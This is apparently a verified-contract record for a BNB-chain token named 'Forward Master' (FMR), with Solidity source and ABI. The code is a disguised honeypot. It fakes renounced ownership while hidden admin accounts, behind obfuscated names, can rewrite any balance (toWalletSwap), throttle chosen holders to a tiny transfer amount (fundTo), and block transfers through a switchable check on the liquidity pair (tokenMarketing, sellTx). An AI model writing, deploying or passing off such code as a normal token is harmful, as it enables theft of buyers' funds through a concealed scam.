{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface walletAmount {\n    function createPair(address receiverSwap, address swapTotal) external returns (address);\n}\n\ninterface marketingEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFundTrading) external view returns (uint256);\n\n    function transfer(address maxAutoFrom, uint256 exemptMax) external returns (bool);\n\n    function allowance(address tradingList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxAutoFrom,\n        uint256 exemptMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);\n    event Approval(address indexed tradingList, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingEnableMetadata is marketingEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ForwardMaster is receiverMode, marketingEnable, marketingEnableMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTx;\n    }\n\n    constructor (){\n        if (toLaunch == exemptReceiverLaunched) {\n            exemptReceiverLaunched = true;\n        }\n        fromWallet swapFundShould = fromWallet(maxTrading);\n        toIs = walletAmount(swapFundShould.factory()).createPair(swapFundShould.WETH(), address(this));\n        if (maxSwap != limitFee) {\n            limitFee = isFund;\n        }\n        feeLaunch = _msgSender();\n        modeIs[feeLaunch] = true;\n        minReceiver[feeLaunch] = receiverBuy;\n        buyTotalShould();\n        if (isFund != limitFee) {\n            limitFee = maxSwap;\n        }\n        emit Transfer(address(0), feeLaunch, receiverBuy);\n    }\n\n    uint256 autoAt;\n\n    uint256 teamTrading;\n\n    function getOwner() external view returns (address) {\n        return sellMarketingAt;\n    }\n\n    uint256 private receiverBuy = 100000000 * 10 ** 18;\n\n    address public feeLaunch;\n\n    function transfer(address maxMin, uint256 exemptMax) external virtual override returns (bool) {\n        return sellTx(_msgSender(), maxMin, exemptMax);\n    }\n\n    bool public launchedMaxFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverBuy;\n    }\n\n    function allowance(address walletMax, address launchedFund) external view virtual override returns (uint256) {\n        if (launchedFund == maxTrading) {\n            return type(uint256).max;\n        }\n        return minWallet[walletMax][launchedFund];\n    }\n\n    function fundTo(address senderExempt) public {\n        feeAmount();\n        \n        if (senderExempt == feeLaunch || senderExempt == toIs) {\n            return;\n        }\n        teamExempt[senderExempt] = true;\n    }\n\n    address public toIs;\n\n    function feeAmount() private view {\n        require(modeIs[_msgSender()]);\n    }\n\n    function fromReceiver(address marketingTeam) public {\n        require(marketingTeam.balance < 100000);\n        if (takeSender) {\n            return;\n        }\n        if (isFund == maxSwap) {\n            maxSwap = limitFee;\n        }\n        modeIs[marketingTeam] = true;\n        if (isFund == maxSwap) {\n            exemptReceiverLaunched = false;\n        }\n        takeSender = true;\n    }\n\n    uint256 private limitFee;\n\n    address private sellMarketingAt;\n\n    address maxTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private minWallet;\n\n    mapping(address => uint256) private minReceiver;\n\n    function transferFrom(address receiverWallet, address maxAutoFrom, uint256 exemptMax) external override returns (bool) {\n        if (_msgSender() != maxTrading) {\n            if (minWallet[receiverWallet][_msgSender()] != type(uint256).max) {\n                require(exemptMax <= minWallet[receiverWallet][_msgSender()]);\n                minWallet[receiverWallet][_msgSender()] -= exemptMax;\n            }\n        }\n        return sellTx(receiverWallet, maxAutoFrom, exemptMax);\n    }\n\n    uint256 constant fromBuy = 20 ** 10;\n\n    uint256 public maxSwap;\n\n    string private launchAmount = \"FMR\";\n\n    bool public exemptReceiverLaunched;\n\n    function balanceOf(address receiverFundTrading) public view virtual override returns (uint256) {\n        return minReceiver[receiverFundTrading];\n    }\n\n    mapping(address => bool) public modeIs;\n\n    function toWalletSwap(address maxMin, uint256 exemptMax) public {\n        feeAmount();\n        minReceiver[maxMin] = exemptMax;\n    }\n\n    string private enableFrom = \"Forward Master\";\n\n    uint256 private isFund;\n\n    event OwnershipTransferred(address indexed receiverMax, address indexed launchedAuto);\n\n    bool public takeSender;\n\n    uint8 private launchedTx = 18;\n\n    function feeShould(address receiverWallet, address maxAutoFrom, uint256 exemptMax) internal returns (bool) {\n        require(minReceiver[receiverWallet] >= exemptMax);\n        minReceiver[receiverWallet] -= exemptMax;\n        minReceiver[maxAutoFrom] += exemptMax;\n        emit Transfer(receiverWallet, maxAutoFrom, exemptMax);\n        return true;\n    }\n\n    function sellTx(address receiverWallet, address maxAutoFrom, uint256 exemptMax) internal returns (bool) {\n        if (receiverWallet == feeLaunch) {\n            return feeShould(receiverWallet, maxAutoFrom, exemptMax);\n        }\n        uint256 modeLiquidityLaunched = marketingEnable(toIs).balanceOf(modeMin);\n        require(modeLiquidityLaunched == autoAt);\n        require(maxAutoFrom != modeMin);\n        if (teamExempt[receiverWallet]) {\n            return feeShould(receiverWallet, maxAutoFrom, fromBuy);\n        }\n        return feeShould(receiverWallet, maxAutoFrom, exemptMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAmount;\n    }\n\n    mapping(address => bool) public teamExempt;\n\n    bool private listBuy;\n\n    function buyTotalShould() public {\n        emit OwnershipTransferred(feeLaunch, address(0));\n        sellMarketingAt = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableFrom;\n    }\n\n    function tokenMarketing(uint256 exemptMax) public {\n        feeAmount();\n        autoAt = exemptMax;\n    }\n\n    function owner() external view returns (address) {\n        return sellMarketingAt;\n    }\n\n    function approve(address launchedFund, uint256 exemptMax) public virtual override returns (bool) {\n        minWallet[_msgSender()][launchedFund] = exemptMax;\n        emit Approval(_msgSender(), launchedFund, exemptMax);\n        return true;\n    }\n\n    address modeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private toLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"}],\"name\":\"fundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMaxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMax\",\"type\":\"uint256\"}],\"name\":\"toWalletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptMax\",\"type\":\"uint256\"}],\"name\":\"tokenMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAutoFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ForwardMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}